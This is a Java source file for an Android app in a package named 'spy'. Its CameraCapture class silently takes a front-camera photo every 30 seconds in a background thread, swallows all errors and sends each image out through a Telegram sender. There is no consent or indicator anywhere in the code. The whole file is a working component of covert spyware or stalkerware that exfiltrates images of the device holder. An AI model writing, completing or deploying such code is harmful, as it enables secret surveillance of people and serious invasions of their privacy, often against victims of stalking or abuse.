package com.deepalzz.spy;
import android.content.Context; import android.hardware.Camera;
import java.io.File; import java.io.FileOutputStream; import java.text.SimpleDateFormat; import java.util.Locale;
public class CameraCapture {
    private Context ctx; private TelegramSender tg; private Camera camera; private boolean running = false;
    public CameraCapture(Context ctx, TelegramSender tg) { this.ctx = ctx; this.tg = tg; }
    public void startCapturing() { running = true;
        new Thread(() -> { while (running) { try { capturePhoto(); Thread.sleep(30000); } catch (Exception e) {} } }).start();
    }
    public void capturePhoto() {
        try { camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
            if (camera == null) camera = Camera.open(0);
            if (camera == null) return;
            camera.takePicture(null, null, (data, cam) -> {
                try { String ts = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new java.util.Date());
                    File f = new File(ctx.getExternalFilesDir(null), "IMG_" + ts + ".jpg");
                    FileOutputStream fos = new FileOutputStream(f); fos.write(data); fos.close();
                    tg.sendFile(f.getAbsolutePath(), "📸 " + ts);
                } catch (Exception e) {} finally { cam.release(); }
            });
        } catch (Exception e) {}
    }
    public void stop() { running = false; if (camera != null) { camera.release(); camera = null; } }
}
